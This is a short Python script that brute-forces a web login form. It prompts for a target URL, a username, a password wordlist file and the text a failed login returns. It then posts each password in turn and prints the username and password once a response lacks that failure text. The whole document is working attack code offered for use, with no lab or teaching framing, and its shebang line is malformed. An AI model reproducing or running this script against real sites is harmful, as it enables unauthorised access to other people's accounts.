#!bin/bash
import requests

url = input("[+] input Url: ")
username = input('[+] Enter Username: ')
password_file = input('[+] Enter password file: ')
login_failed =input('[+] Enter String that Occurs when Login Fails: ')

def cracking(username, url):
    for password in passwords:
        password = password.strip()
        print(f'{password}')
        payload = {
                'username' : username, 
                'password' : password,
                'Login' : 'submit'
                }
        response = requests.post(url, data=payload)
        if login_failed in response.content.decode():
            pass
        else:
            print(f'[+] Username Found:{username}')
            print(f'[+] Found Password:{password}')
            exit()

with open(password_file, 'r') as passwords:
    cracking(username, url) 